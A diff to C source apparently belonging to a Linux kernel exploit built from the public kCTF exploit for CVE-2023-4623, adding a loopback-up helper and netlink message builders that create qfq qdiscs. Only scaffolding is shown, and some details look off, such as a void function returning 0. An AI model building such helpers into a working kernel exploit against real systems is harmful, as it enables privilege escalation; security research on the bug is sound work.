@@ -1,4 +1,43 @@
 #include "net.h"
+
+/*
+    lo interface up
+*/
+void loUp(void){
+    int sock;
+    struct ifreq ifr;
+
+    // Open a socket
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+    // Specify the interface (loopback in this case)
+    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
+
+    // Get current flags
+    if (ioctl(sock, SIOCGIFFLAGS, &ifr) < 0) {
+        perror("Getting interface flags failed");
+        close(sock);
+        exit(EXIT_FAILURE);
+    }
+
+    // Set the interface up
+    ifr.ifr_flags |= IFF_UP;
+
+    // Apply the new flags
+    if (ioctl(sock, SIOCSIFFLAGS, &ifr) < 0) {
+        perror("Setting interface up failed");
+        close(sock);
+        exit(EXIT_FAILURE);
+    }
+
+    // Close the socket
+    close(sock);
+    return 0;
+}
 /*
     Functions from kCTF public exp cve-2023-4623:
 */
@@ -191,8 +230,25 @@ struct tf_msg * contactQdiscStab(struct tf_msg * m, char *data , size_t size){
 
     return m;
 }
+// Macro for default parameters
 
-struct tf_msg * qfqQdiscAdd() {
+
+struct tf_msg * qfqQdiscAdd(u32 handle, u32 parent) {
+    // Kernel Handler: function hfsc_init_qdisc
+    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
+    // -> Calling tc_modify_qdisc 
+    init_tf_msg(m);
+    m->nlh.nlmsg_type    = RTM_NEWQDISC;     
+    m->nlh.nlmsg_flags   |= NLM_F_CREATE;
+    m->tcm.tcm_handle    = handle;
+    m->tcm.tcm_parent    = parent;
+    
+    // Set TCA_KIND     
+    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
+    return m;
+}
+
+struct tf_msg * qfqQdiscAddDef() {
     // Kernel Handler: function hfsc_init_qdisc
     struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
     // -> Calling tc_modify_qdisc 
@@ -206,6 +262,8 @@ struct tf_msg * qfqQdiscAdd() {
     m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((char *)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
     return m;
 }
+
+
 struct tf_msg * qfqClassAdd(enum hfsc_class_flags type, u32 classid,u32 val){
     struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
     init_tf_msg(m);
